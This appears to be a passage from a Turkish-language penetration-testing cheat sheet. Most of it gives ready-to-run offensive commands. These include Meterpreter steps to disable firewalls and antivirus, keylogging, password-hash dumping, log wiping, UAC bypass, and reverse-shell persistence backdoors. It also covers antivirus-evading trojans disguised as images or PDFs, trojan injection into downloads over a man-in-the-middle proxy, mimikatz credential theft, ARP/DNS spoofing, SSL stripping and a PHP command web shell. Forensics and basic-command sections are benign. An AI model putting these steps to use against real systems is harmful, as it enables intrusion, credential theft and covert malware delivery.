    run getcountermeasure -h
    run getcountermeasure -d	=	Güvenlik duvarını devre dışı bırakır.
    run getcountermeasure -k	=	Virüs programını devre dışı bırakır.
    olmazsa;
        Güvenlik duvarı için:
    1.shell yaz komut satırına geç
    2.netsh advfirewall set allprofiles state off/on (kapa yada aç)
    Virüs programı için:
    1.meterpreter ortamında “ps” ile çalışan process leri gör.
    2.virüs pid yazar kapatırız  (kill 2592)
    
    Klavye Tuşlarını Kaydetme
    1.	“run keylogrecorder”
    Ctrl+c ile durdur. txt dosyasına kaydeder.
    2.	“keyscan_start”	=>  başlat
    “keyscan_stop”		=> durdur
    “keyscan_dump”	=> sonuçları görüntüleme
    
    Hedefte Dosya Arama
    “search -f *.txt -d aranacak yer”
    
    Şifreleri Elde Etme
    “hashdump”	=> Şifreleri getirir hash değerli olarak
    
    Klavye Mouse Devre Dışı Bırakma
    “uictl disable/enable keyboard”
    “uictl disable/enable mouse”
    
    Uzak Masaüstü Bağlantısı
    “rdesktop ip adresi”
    
    Yüklü Uygulamalar ve Versiyonlarını Görme
    “run get_application_list”
    
    Dns Spoofing
    Sitenin yönleneceği yeri seçme
    Host dosyasını düzenleme;
    Tek adres için	=>	run hostedit -e ip adres, site adı
    Çoklu adres için	   =>	run hostedit -l  /..../....txt
    Not : Kullanıcı denetimi isteyebilir.
    
    Paket Sniffing
    use sniffer_start 2    // 2 ağ kartı numarası
    use sniffer_stop 2
    sniffer_dump 2 /root/...pcap  => dinlemeyi kaydet.
    
    Arkada Bırakılan İzleri Temizleme
    “clearev”
    “run event_manager -c”
    
    PC’nin Kullanılmadığı Süreyi Görme
    “idletime”
    
    Kullanıcı Denetimini Kapatma
    Exploit ile yapıyoruz. Backgrounda geç
    1.	use exploit/windows/local/bypassuac
    set session 1
    exploit
    2.	shell => reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\system /v EnableLUA /t REG_DWORD /d 1 /f      // 1 açar,  0 kapatır
    
    Exploiti Başka Uygulamaya Enjekte Etme
    Pc yeniden başladığında otomatik çalışması için
    Fark edilmemesi için
    “migrate pid no”
    
    Yetki Yükseltme
    “getuid”	=>	Yetki görme
    1.	yol)	“getsystem”	=> Yetki yükseltme
    2.	yol)	Oturumu backgrounda al
    use exploit/windows/local/ppr_flatten_rec
    show option
    set session 1
    exploit
    3.	yol)	“use exploit/windows/local/bypassuac” exploitini dene
    
    Kullanıcı Adı Parola Girerek Sisteme Giriş
    use exploit/windows/smb/psexec
    set payload windows/meterpreter/reverse_tcp
    set RHOST hedef ip
    set SMBPass parola
    set SMBUser kullanıcı adı
    set LHOST kendi ipmiz
    
    Arka Kapı Oluşturma
    Bağlantı koptuktan sonra tekrar bağlanabilmek için;
    “run persistence”
    “run persistence -A -L  C:/Windows/system32  -U kullanıcı adı  -i 25 -p 4444 -r kendi ip adresimiz”
    -A	=	otomatik başlama
    -L	=	belirtilen yola saklansın
    -i	=	belirtilen saniyede bir bağlantıyı kontrol eder, tekrar bağlar
    Bağlantı açmak için;
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST
    set LPORT
    exploit
    
    Zamanlanmış Görevleri Kullanarak Backdoor Yükleme
    Admin yetkisiyle shell ekranında;
    “schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn backdoor /tr “\” C:\\Users\Default\\evil.exe\””
    
### Token Elde Etme
    Load incognito
    list_tokens -u
    impersonate_token “domain\\kullanıcı”   (geçmek istediğin tokenı yaz)
    rev2self	Eski tokena dönme
    get privs 	Kullanıcı yetkilerini görme
    SeDebugPrivilege	Başka prosess belleğini okuma
    Assing Primary İmpersonate varsa rottenpotato kullan.
    Load incognito
    execute -f potato.exe -Hc
    list_tokens -u


### Searchsploit :	
    Güncel exploitleri bulmaya yarayan bir araç.
	`searchsploit facebook`
	
### Social-Engineering Toolkit :
	Sosyal mühendislik saldırılarında kullanılır. Sosyal mecraları yada herhangi bir siteyi klonlamada kullanılır.
	Örnek saldırı : Usb takınca direk bağlantı kurma.
	1 yaz enter
	İnfectious Media Generator
	2
	2
	Local ip adresi gir
	Port gir
	root/.set/ dosyası oluştu. Bu dosyayı usb veya cd yazdır. takıldığı pc otomatik dinlemeye geçer.

### Hidden Eye
Sosyal mecraları klonlamada kullanılır.


### Termineter :
	Akıllı sayaçların penetrasyon testlerinde kullanılır.
	“termineter”  -> “show modules”  -> “use modul adı”  -> “show options”  -> “set ....”  ->“run” 
	
## 08. SNIFFING & SPOOFING (KOKLAMA VE SIZDIRMA ARAÇLARI):

### Ettercap :
    Ağı dinleme ve yönlendirme yapmaya yarar.
    
    Hedefteki cihaza saldırıp şifreleri ele geçirmek için :
    `ettercap -Tq -M arp:remote -i wlan0 /modem_ip//   /hedef_ip//`
    
    Site yönlendirme yapmak için:
    `leafpad /etc/ettercap/etter.dns`	//site yönlendirmelerini düzenle
    `ettercap -Tq -M arp:remote -P dns_spoof -i eth0 /// ///`
	//plug-ini dns_spoof yazan yere de yazabiliriz yada programı çalıştırıp p ye basarak seçebiliriz.

### Ferret , Hamster :
    Ferret : Ağ üzerine kullanıcıların girdikleri web sitelerini kaydeder.
    “ferret -i eth0” -> Bilgi toplamaya başlar.
    
    Hamster : Ferret’ten gelen bilgileri görsel olarak düzenli şekilde görülmesini sağlar.

### Macchanger :
    Mac adresini değiştirmeye yarar. 
    “ifconfig eth0 down”     ->     Önce ağ kartı devre dışı bırakılır.
    “macchanger -r eth0”    ->     r parametresi rastgele mac adresi oluşturur.
    “macchanger --mac 12:23:34:45:56:67 eth0”    ->      Elle mac girmek için.
    “ifconfig eth0 up”          ->    Ağ kartı tekrar aktif edilir.
    “macchanger --permanent eth0”     ->    İlk orjinal ayarına döndürür.
    
    Başka bir mac adres değiştirme yöntemi :
    “ifconfig wlan0 down”
	“ifconfig wlan0 hw ether 00:11:22:33:44:55”

### Mitm Proxy :
	Ağdaki kullanıcıların girdikleri web sitelerini analiz eder.
    
    Port yönlendirme için izin verme :
	`echo 1 > /proc/sys/net/ipv4/ip_forward`  -> bu dosyadaki 0 değerini 1 yaptık.
	
	Port yönlendirme için :
	`iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to -port 8080`  ->  80’den gelenleri 8080’e yönlendir.
	
	Arp yönlendirmesi (arpspoof):
	`arpspoof -i eth0 -t hedef_ip_adresi  modem_ip_adresi`
	`mitmproxy -T -p 8080`
	
### Arp Saldırısı :
    Ağdaki Gateway aygıtının mac adresini kendi cihazımız olarak ayarlayıp, ağdaki diğer cihazların yönlendirmelerini kendi üzerimizden yapmak. Mıtm proxy ile aynı işlemler.
    
    Arp ile ağdaki cihazların keşfi;
	“arping 192.168.0.1” => Modeme ping atar, mac adresini öğrenir.
   
    Ağda kimler var;
	“arp-scan --localnet”
	“arp-scan --localnet --interface=eth0(wlan0)”
    
    Port yönlendirme için izin verme :
    “echo 1 > /proc/sys/net/ipv4/ip_forward”  -> bu dosyadaki 0 değerini 1 yaptık.
    
    Arp yönlendirmesi (arpspoof):
    “arpspoof -i eth0 -t hedef_ip_adresi -r modem_ip_adresi”
   
    Hedef ip gateway’e gitmeye çalışırken bizim eth0 interface’imizden geçecek.
    -r reverse ( Her iki taraf içinde zehirleme yapar tek komutta )


### Responder :
	Ağ üzerinde netbios’dan gelen istekleri izler. Ağda herhangi bir dosya paylaşımına ulaşılmak istendiğinde araya girerek kullanıcı adı ve şifreleri öğrenir. 
   
    `python Responder.py -i 192.168.42.131 -I eth0 -w -r -f`  komutu ile uygulamayı çalıştırıyoruz.

    -i   : Ip adresimizi belirttik.
    -I   : Ağ adaptörümüzü belirttik. ( eth0, gns33, wifi0 vs.)
    -w   : WPAD Proxy sunucusunu başlatır. Default olarak kapalı gelir.
    -r   : NetBIOS’un wredir sorgularına cevap verir
    -f   : Makine parmak izlerini izlememizi sağlar.    

#### Smb sign özelliğine bakma
    “python /usr/share/responder/tools/Runfinger.py -i 192.168.1.1/24” yada
    “responder-RunFinger -i 192.168.0.0/24”

### Wireshark :
	Ağ analizinde kullanılır. Ağ kartına tıklanarak dinlemeye başlanır.
    Protokol adı contains “aranacak kelime ” = O protokol verileri içerisinde geçen aranan kelimenin olduğu satırları getirir.
    File>Export Object ile dosyaları dışarı çıkart.

### Tshark :
    tshark -i eth0 -w dosya.pcap -f “tcp” -c 10 --capture-comment “yorum satırı”
    i = interface
    w= oluşturulacak dosya adı
    f= protokol filtreleme
    c= yakalanacak paket miktarı
    r= okunacak dosya
   
### DNS Spoofing
    Hedefe DNS yönlendirme yaptırarak istediğimiz adrese gitmesini sağlarız.
    1.	Dns config dosyası oluştur. (dns.cfg)
    192.168.1.15	*.google.com
    (kendi ip’miz)
    2.	Klon site yap. (Örnek : setolkit programıyla google kopyala.)
    Oluşan klon siteye kendi ip mizin 80 portundan bakabiliriz.
    3.	“dnsspoof -i eth0 -f /root/Desktop/dns.cfg”


## 09. POST EXPLOİTATİON (İSTİSMAR SONRASI):

### YETKİ YÜKSELTME (WINDOWS)
    systeminfo hotfix dosyalarına bak. Güncelleme almayan yamayı bul. Sisteme sok.Yetki yükselt.
    
    Güncellemelerin Kontrolü : wmic qfe get Description, HotFixID, InstalledOn
   
    Yüklü uygulamaların kontrolü :  “wmic product get name, version”
   
    Bilinmeyen Path Yollarını Kontrol Etme : accessChk.exe aracıyla 
    
    Msi paketinin yüklenmesinin kontrolü : “reg query 
    
    HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer”  -> PS ekranına komutu girin. Değer 1 olarak ayarlıysa zafiyet mevcuttur. Zafiyeti tetiklemek için msi paketi üretmek gerekir.
    Import-Module .\powerup.ps1
    Write-UserAddMSI ile kullanıcı oluştur.

### YETKİ YÜKSELTME (LINUX)
    ***Kernel kontrol et. “uname -a” ile kernel sürümüne bak. Exploit ara.
    “searchsploit” den ara

    *** sudo –l komutu ile sudoers yetkilerini kontrol et.

### Shellter :
	Oluşturulan zararlıyı başka dosyayla birleştirme aracı.
    Windows örneği : 
	a -> Enter -> no -> putty.exe -> y
	7 payload var. l seçersek listeden c seçersek kendi payloadımız.
	l -> 1 -> ip adresi -> port -> 

### Exe2Hex :
    exe dosyalarını binary kodlarına çeviren araç. Bu sayede virüs programları bulamıyor.
    Örnek : Önce payload oluşturuyoruz. (SET programı ile)
    1 -> 4 creat payload -> 2 -> local ip gir -> port gir -> trojen oluştu. (payload.exe)
    “exe2hex -x payload.exe -p payload.cmd”
    Oluşturulan payload.cmd dosyasını metin belgesi ile aç. En sonuna hemen çalışması için start payload.exe gir .Kaydet.
    Hedef pc’de çalıştığında önce exe haline çevirir. En son yazdığımız komutla o exe çalışır.

### Mimikatz :
    Windows üzerinde parola elde etmeye yarayan araç.
    1.	Görev yöneticisinden lsass.exe ‘yi dump al.
    2.	Dinleme moduna al;	
    mimikatz # privilege::debug
    3.	Dump dosyasını mimikatz klasörüne at yada yolunu belirt.
    mimikatz # sekurlsa::minidump lsass.dmp
    4.	mimikatz # sekurlsa::logonPasswords full

### Powersploit :
	Windows üzerinde powershell ile çalışır.

### Proxy Chains :
	Ağ testlerinde gizlilik sağlayan bir araç. (Tor ağı üzerinden). Hız olarak biraz yavaş.

### 4nonimizer :
	Ağ üzerinde gizlilik sağlar.

	https://github.com/Hackplayers/4nonimizer.git githubdan indir.
	
	./4nonimizer install -> Yükle
	
	./4nonimizer start -> Programı başlat. ip adresini değiştirir.Vpn mantığı. Durdurmak için stop komutunu kullan

### Weevely :
	Php sunucularda virüs programına ve güvenlik duvarlarına yakalanmayan troje oluşturmaya yarar.
	“weevely generate 12345 /root/...  .php” (Arka kapı oluşturma işlemi)
    “weevely hedefe_atmış_olduğun_dosya_yolu 12345”

### SSH Private Key
    Sisteme girdikten sonra yetkili kullanıcının SSH Private Keyini /home/yetkili_kullanıcı/.ssh dizini altından okuyorsak locale alıp id_rsa.txt olarak kaydet.
    
    python3 /usr/share/john/ssh2john.py id_rsa.txt > decrypted.txt   (john anlayacağı şekle dönüştürür)
    
    john --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt (şifreyi kırar)
    
    ssh yetkili_kullanıcı@hedef_ip -i id_rsa.txt  (bağlan)  (yetki hatası verirse 0400 olarak chmod ver)

## 10. FORENSICS (ADLİ ARAÇLAR):

### Autopsy :
    İmajı alınmış bir sistemin detaylı incelenmesini sağlar.
    Linke tıklayarak aç -> New Case -> Add host -> İmage dosyası göster / Copy seç -> Add (İncelemeye başlar)
    
    İmage alma :
	“fdisk -l”  -> Tüm diskleri görme
	“dd if=image yolu of=çıkış yolu

### Binwalk :
    Donanımların yazılımını inceleyen araç.
    “binwalk -e airties.bin” -> Airties modemin yazılım dosyası içindekileri inceler.

### Bulk Extractor :
    Diskleri veya image dosyalarını analiz edip detaylı bilgi edinmeye yarar.
    “bulk_extractor -o /root/.....    /dev/sda5

### Foremost :
	Disklerin içerisindeki istediğimiz uzantılı dosyaları bulmaya yarar.
	“foremost -t png -i /aramanın_olacağı_yer -o /root/kaydedileceği_yer”

### Galleta :
	İnternet explorerdaki cookie bilgilerini incelemeye yarar.
	“galleta /cookie dosya yolu.txt > /çıkış yolu
### Hashdeep :
	iki dosyanın birbiri ile aynı olup olmadığını inceler.
	“hashdeep dosya.txt”
	Hash değeri verir.Hash değerleri karşılaştırılarak dosyanın aynı olup olmadığı anlaşılır.

### Volafox:
	Mac OS sistemlerde ram analizi yapar.
	“volafox -i image_yolu -o istenilen parametre”
### Volatility :
	Windows sistemlerde ram analizi yapar.
	Önce ram imajı almak için DumpIt aracını kullanıyoruz.  raw uzantılı dosya oluşturur.
	İncelemek için :
	“volatility -f image yolu imageinfo” -> İşletim sistemi bilgisi getirir. Buradaki suggested profil bilgisi kopyalanır.
	“volatility -f image yolu --profile kopyalanan_suggested_profil_bilgisi hashdump” ile incelenir.

	Komutlar:
	pslist 		-> Çalışan proses bilgileri
	imageinfo 	-> İşletim sistemi tespiti
	pstree		-> İşlemleri ağaç yapısında gösterir
	dlllist		-> Çalışan tüm dll ler
	cmdscan	-> cmd de çalıştırılan komutlar
	consoles	-> cmd de çalıştırılan komutlar
	iehistory	-> IExplorer tarayıcı geçmişi

## 11. REPORTING TOOLS (RAPORLAMA ARAÇLARI):
### Cuty Capt :
	Web sitelerin ekran görüntülerini almaya yarayan araç.
	“cutycapt --url=www.google.com --out=/root/çıkarılacak_yer”

### Dradis :	
	Penetrasyon testlerinde bir grup oluşturulduğunda ortak bir havuzda bilgi toplanmasına yarar.
### Faraday :
	Penetrasyon testlerinde yapılan işleri kaydetmeye yarayan araç. Komut satırına yazılan herşeyi kayıt altına alır.

### KeepNote :
	Geliştirilmiş not defteri aracı.
### Pipal :
	Wordlistleri analiz eden bir araç
### recordmydesktop:
	Masaüstü görüntüsünü video olarak kaydetmeye yarayan araç.	

## PRIVILEGE ESCALATION ( YETKİ YÜKSELTME)

### LINUX
    1.	.bash_history dosyası okunarak önceden girilmiş komutlar incelenir.
    2.	İçinde password geçen dosyalar find komutu ile taranır.
    3.	sudo -l komutu ile yetkilere bakıldığında;
    nmap:
    sudo /usr/bin/nmap --interactive yazarak nmap komut satırına düşebiliriz.  !sh yazılır.
    vim:
    sudo /usr/bin/vim –c ‘!/bin/sh’
    apache2:
    sudo /usr/sbin/apache2 –f /etc/shadow    (shadow dosyasının içini okuma)
    4.	

### WINDOWS

## BUFFER OVERFLOW

    1.	Hedefe fazla veri göndererek çökertebiliyormuyuz dene.(pattern_create ile)
    2.	Pattern offset ile kaçıncı değerde çöktüğünü bul.
    3.	EIP veri yazabiliyormuyuz dene.
    4.	Immunity Debugger’da Mona.py aracıyla uygulamada Ram koruması olmayan yerleri bul
    !mona modules (Hepsi FALSE olan yerler)
    5.	JMP ESP(FFE4)  komutunun geçtiği yerleri bul.
    !mona –find –s “\xff\xe4” –m örnek.dll (hepsi false olan bir dll)
    6.	Processin Hex değeri bizim EIP’ye yazacağımız değer olacak.
    7.	Shell kod ile EIP değeri arasına noop kodu yazılır, es vermek için. “\x90” * 50 örnek
    8.	Hepsini bir değişkene ata ve karşı tarafa socket ile komutu gönder

### generic_send_tcp
    Hedefe otomatik veri gönderip crash ettirmeye yarayan uygulama.
    Kullanımı =    “generic_send_tcp host port spike_script 0 0”
    Spike_scriptler =   usr/share/spike/audits
### Pattern
    Usr/share/metasploit-framework/tools/exploit
    “pattern_create.rb -l 3000”  =>  3000 karakterlik benzersiz kod oluşturur.
    “pattern_offset.rb -l 3000 –q EIPdeki değer” =>  Kodun kaçıncı karakterine denk gelen sayıyı verir.
    nasm_shell.rb =>  Girilen kodun hex değerini verir.


LINUX TEMEL KOMUTLAR

cp		=	Kopyalama
rm		=	Dosya silme
rm -rf		=	Klasör silme
cp -rf		=	Klasör kopyalama
grep		=	İçeriği filtreleyerek getirme
ls -a		=	Gizli klasörleri görme
ls -al		=	Gizli klasörleri listeli görme
ls -ln		=	İzinleri görme
ln -s		=	“ln -s /root/dosya_adı  /root/yeni_yolu”  -> Kısayol oluşturma
tracert, pathping  =   Hop atlama
history		=	Önceden girilen komutları getirir.
cat		=	Metin belgesi içindekileri okuma
man		=	“man program_adı” -> Bir programın nasıl kullanıldığını gösterir.
ps		=	Çalışan prosesler
kill		=	kill -9 PID  -> Çalışan 9 numaralı prosesi sonlandırır.
htop		=	İşlemci tüketimini gösterir.
more		=	Terminal ekranına belirli miktarda çıktı gösterir.
uniq		=	Aynı olan kelimeleri teke düşürür.
sort		=	Harf sıralamasına göre düzenler
halt		=	Ekranı kilitler, geri dönüşü olmaz
tail -f log_dosyası	=	Dosyanın sonunu getirir ve günceller.
locate 		=	Aranan dosyanın yolunu bulma.  updatedb ile güncellemen gerekir.
find		=	Aranan dizin ya da dosya bulma 
find  /etc -type f -name “*.py” -perm -u+x -mtime -5 | xargs ls -ls
find . 		= Bulunduğu dizin altını arar.
name 		= Tırnak içine aranacak dosya yazılır.
type 		= Dosya tipi. f dosya , d dizin
perm 		= İzin Yetkileri. Örnekte kullanıcının çalıştırılabilir dosya yetkileri
mtime 		= Gün cinsinden değer. Örnekte son 5 gün
atime 		= Dakika cinsinden değer.
size 		= veri boyutuna göre bulma  -size -10M (10megabayt tan küçük olanlar)
find . | wc -l  	= Kaç satır bulduğunu gösterir.
Gzip	= dosya sıkıştırır
gunzip	= sıkıştırılmış klasörü çıkarır.

grep / awk
ifconfig | grep -i “ether” | awk ‘{print $2}’	->	mac adresini ekrana bastırdık
i = ignore . Büyük küçük harfe duyarlı olma.
v = Belirtilen kelimenin geçtiği satırları getirme
c = Kelimeden kaç tane geçtiğini gösterir.
sort -n = dosya içeriğini sıraya göre getirir.

fdisk, df	=	Disk durumunu görme
fdisk -l		=	Disk bölümlerini görme
free		=	Ram durumunu görme
top, vmstat	=	Cpu durumunu görme
id		=	Yetkileri görme
getprivs	=	Meterpreter ekranında yetkileri görme
whoami	=	Hangi kullanıcı olduğumuzu görme
uname -a	=	İşletim sistemi	, versiyon, kernel bilgisi alma
lsb_release -a =	Dağıtım adını öğrenme
lshw		=	Donanım hakkında bilgi alma
dmidecode --type [bios]  =  Sistem hakkında bilgi alma

Linux ip verme 		=	ifconfig eth0 10.0.0.10
İp adresini öğrenme		=	curl icanhazip.com, curl ifconfig.me
Gateway, mask verme	=	route add default gw 10.0.0.1 netmask 255.0.0.0 eth0
Gateway adresini öğrenme	=	netstat -rn , route -n
Portu kullanan servisler	=	lsof -i :80  (80 portunu kullanan processleri getirir.
Ağ servisini yeniden başlatma	=	systemctl restart NetworkManager.services
Web server açma			=	service apache2 start    var/www/html dizini
Arp tablosunu görme			=	arp ,  arp -a
Dns ip öğrenme			=	cat /etc/resolv.conf
Dns ip değiştirme			=	nano /etc/dhcp/dhclient.conf
						#prepend domain-name-servers 127.0.0.1;	 ->								#işaretini kaldır,   127.0.0.1 yerine yeni dns leri gir.
Kullanıcı ekleme		=	adduser, useradd
Kullanıcı silme			=	deluser, userdel
Parola oluşturma		=	passwd kullanıcı_adı
Yetkilendirme			=	chmod +777 dosya_adı
Kullanıcıları görme		=	cat /etc/passwd
Parolaları görme		=	cat /etc/shadow	cat /etc/shadow | grep “root:”
En yüksek yetkili kullanıcıyı görme	=	cat /etc/passwd | grep “x:0”
Parola özetini görme	=	cat /etc/shadow | grep “root:” | cut -d “$” -f4 | cut -d “:” -f1
Silinmiş kullanıcıları görme	= cat /var/log/secure | grep userdel
***   /var/log/secure => Oluşturulmuş ve silinmiş kullanıcıların loglarını tutar.
Sistemin şifreleme algoritmasını bulma	=	authconfig --test | grep hashing
En son ssh bağlantısı yapılan yeri görme	= home/kullanıcı ad/.ssh/known_hosts dosyasında yazar.
Ssh hatası verirse		=       ssh -oHdstKeyAlgorithms=+ssh-dss root@192.168.1.24
apt update			=	Paketlerin yüklendiği veri tabanını günceller
apt upgrade			=	Sistemdeki tüm programları günceller
apt install paket_adı 	 	=	Program yükleme
apt remove paket_adı		=	Program silme
Patch Yolu Gösterme		=	export PATH=$PATH:/dosya/dosya
sudo -l				=	sudo yetkilerini görme (sudoers.d dosyasını okur)
cat /etc/crontab		=	Zamanlanmış görevleri göster.
Klavye dilini kalıcı değiştirme =      nano /etc/default/keyboard -> XKBLAYOUT="tr"


WINDOWS TEMEL KOMUTLAR

Yerel kullanıcı ekleme		=	net user (kullanıcı adı) (parola) /add
Domain kullanıcısı ekleme	=	net user (kullanıcı adı) (parola) /DOMAIN
Kullanıcı silme			=	net user (kullanıcı adı) /del
Domain grubuna Admin yetkili 	=	net group “domain admins” (kullanıcı adı) /add /DOMAIN
kullanıcı ekleme
Kullanıcı ayrıntılarını görme	=	net user (kullanıcı adı)
Kullanıcıları görme		=	wmic useraccount get sid, name  //sadece admin kullanıcısını görmek
      					için komutun sonuna “ | findstr /L 500” yaz	

İp adresini öğrenme		=	curl icanhazip.com
Gateway adresini öğrenme	=	netstat -rn

ver				=	İşletim sistemi versiyonunu gösterir.
whoami /priv			=	Kullanıcının yetkilerini gösterir.
Görev zamanlayıcı oluşturma
SCHTASKS /Create /SC WEEKLY /D MON /TN cmd /TR c:\windows\system32\cmd.exe
Haftanın Pazartesi günleri cmd.exe komutunu çalıştır.
Powershell Üzerinden Log İnceleme
Get-EventLog -LogName System -Index <Index_no> 

VPN :
* Mozilla Firefox tarayıcıda Vpn kullanımı için web tarayıcı adres kısmına “about:config” gir.
“media.peerconnection.enable” -> false yap.  (Gerçek ip adresinin vpn kullanımında bazı yerlerde geçmesini engeller.)
Vpnbook ‘a gir. Openvpn sekmesinden indirilen vpn dosyasını “unzip” ile çıkar. “openvpn açılacakportadı.ovpn” (Yükleme yaparken tarayıcı pencereleri kapat)
* Opera tarayıcı içinde Vpn var.
*** www.dnsleaktest.com -> Hangi ülke ip’sinde olduğunu görme. Gerçek ip mizi bulunabilir mi test eder.
TOR Browser :
Kaliye Tor Kurma;
 “apt-get install tor -y”
“apt-get install proxychains”
leafpad /etc/proxychains.conf
	#dynamic_chain	//# işaretini sil
	#strict_chain		//# işareti ekle
	En alttaki socks4 -> socks5 yap. Kaydet
Tarayıcıda : proxy ayarları -> manuel ayarları seç. socks host : 127.0.0.1  port: 9050 gir
Tor ağını başlat	=>	“service tor start”
**Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;
“proxychains curl icanhazip.com”	=> Yazacağın her komutun başına proxychains yaz, ip gizlenir.

MITM (Man in the Middle Framework):
Yüklemek için 	->	“apt-get install mitmf”
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0”
Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)
MITM DNS
Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.
“leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada [[[A]]] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (*.hotmail.com = 192.168.1.1)
Yönlendirmeyi başlatma :
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --dns”

Ekran Görüntüsü Alma:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --screen --interval 20” (20 saniye)
Görüntülerin kaydedildiği yer : /var/log/mitmf
Hata verirse : “pip install Twisted=15.5.0”
Klavye Tuşlarını Takip Etmek:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --jskeylogger”
Java Script Kodlarını Çalıştırmak:
“mitmf --arp --spoof --gateway modem_ip --target hedef_ip -i eth0 --inject --js-payload “alert(‘...’);”

BDF (Backdoor Factory) Proxy:
Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;
1-	Aynı ağda olmak
2-	Man in the middle olmak
3-	BDF Proxy ayarlarını yapmak gerekir.

“leafpad /etc/bdfproxy/ bdfproxy.cfg”
1-	proxy mode = transparent
2-	Hedef işletim sistemi neyse ordaki host ip yerine kendi ip mizi yazıyoruz.
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080”
(80’den gelen bağlantıyı 8080’e yönlendir)
“bdfproxy” yaz. Saldırıyı başlat.
MITM saldırısını başlat. Dinleme modu için;
“msfconsole -r /usr/share/bdfproxy/.... .rc (bdfproxy nin dinlediği dosya yolu)
SSL Strip Çalıştırma (Https’i Http’ye Çevirme)
“ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”

“sslstrip”
Ettercap çalıştırma:
“ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”
// -S -> sslstrip kendimiz yaptığımız için S koymalıyız.
Virüslü Dosyayı Görsel Dosya İle Birleştirme:

Shellter
İki farklı dosyayı birleştirmeye yarar. POST EXPLOİTATİON (İSTİSMAR SONRASI) bölümünde var.
Fake Image Exploiter
Github’dan indir
1-	Setting dosyası ayarlarını değiştirme;
a.	Leafpad ile aç.
i.	picture extension : jpeg (resim formatını gir)
ii.	payload extension : exe (trojan formatını gir)
2-	“bash FakeImageExploiter.sh” -> Programı çalıştır.
3-	exe dosyayı göster -> jpeg dosyayı göster -> icon seç -> isim gir -> ip gir -> port gir -> metot gir
Daha inandırıcı olması için herhangi bir programla icon resmini değiştirebiliriz.
Uzantısını değiştirebiliriz;
Dosya adını kopyala, not defterine yaz. Karakter işlemden sağdan sola methodunu seç. Dosya adını yeniden oluştur.

SİTE ZAFİYETLERİ

Brute Force (Kaba Kuvvet) Saldırısı
Kullanıcı adı ve parola girilen yerlerde belli bir kısıtlama yoksa sürekli deneme yaparak (wordlist aracılığıyla) kullanıcı adı ve parolayı tespit etmeye yarar. Örnek program “Hydra”
Command Injection (Komut Enjeksiyonu)
Bir web uygulaması üzerinde uzaktan kod çalıştırabilme. Text yazılan kısma özel karakter (&&) girdikten sonra yazılan komutlar, komut satırında yazılıyormuş gibi davranır.
CSRF (Siteler Arası İstek Sahtekârlığı) Zafiyeti 
Giriş panellerinde oluşan açıktır. Girilen kullanıcı adı ve parola değiştirildiğinde adres satırında girilen değerler yazar. Adres satırından şifreler değişebilir.
File Inclusion Zafiyeti
Bulunduğu sistemdeki dosyaları okumaya yarayan araçtır. (etc/passwd dosyasını)
File Upload Zafiyeti
Siteye zararlı bir dosya upload ederek ele geçirmek. (Örnek siteye shell atılması)
php shell atma :  pentestmonkey sitesinden php reverse shell indir. ip ve port değiştir.
cmd shell örneği :   <?php system ($_GET[‘cmd’]);?>
Sql Injection Zafiyeti
“ ’ ” tırnak işareti konduğunda syntax hatası veriyorsa sql açığı olduğunu anlarız.
Sql Injection (Blind)
Sql Injection açığından farkı; açık olduğu web sitesine yansıtılmaz yani hata kodu görülmez.
XSS Reflected Zafiyeti
Yazı yazılabilen bir alanda bu zafiyet olabilir. Reflected zafiyetinde yazılan kodlar sadece bizi etkiler, siteye kaydedilmez.
XSS Stored Zafiyeti
Yapılan işler veri tabanına kaydedilir. Bütün giriş yapan kullanıcılar etkilenir. Html, javascript kodları çalışır.
PYTHON
Python dilinde kod yazma :	#!/usr/bin/env python
Türkçe karakter desteği :	# -*- coding: utf-8 -*-
base64 decoder :	for word in $(cat şifre.txt);do echo $word | base64 --decode >> çıktı.txt; done
Komut satırında çalışmak için :
import os  	 //Komut satırında çalışmak için os ekledik
os.system(“apt-get install figlet”)	//figlet büyük yazı yazdırma aracı
os.system(“clear”)
os.system(“figlet mac değiştirme”)
Ekrana yazı yazdırmak :	print(“””üç tırnak arasına ekranda görmek istediğini yaz”””)
Seçenekler arasından seçim yapmak :
islemno = raw_input (“İşlem no girin”)
if (islemno==”1”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap” + hedef ip)
elif (islemno==”2”):
hedef ip =raw_input(“hedef ip girin:”)
os.system(”nmap -sS -sV” + hedef ip)
else: print(“hatalı seçim”)

CTRL + K + C	=	Toplu yorum satırına alma
CTRL + K + U	=	Toplu yorum satırını kaldırma

Scapy

ARP Poison
ARP Request paketi	=  scapy.ARP(op=1) (Default)
ARP Response paketi	=  
degisken = scapy.ARP(op=2,pdst=hedef ip, hwdst=hedef mac, psrc= modem ip gir)
scapy.send(degisken)  :  Paketi gönderir.
hwdst	= Hedef mac adresi
pdst	= Hedef ip adresi
psrc	= Kaynak ip adresi
hwsrc	= Kaynak mac adresi

Python Kodunu Exe Yapma

"C:\Users\TR\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe" MyPackage.py --onefile --add-data "C:\Users\TR\Desktop\adobe.pdf;." --noconsole --icon C:\Users\TR\Desktop\pdf.ico

BIND SHELL , REVERSE SHELL

BIND SHELL
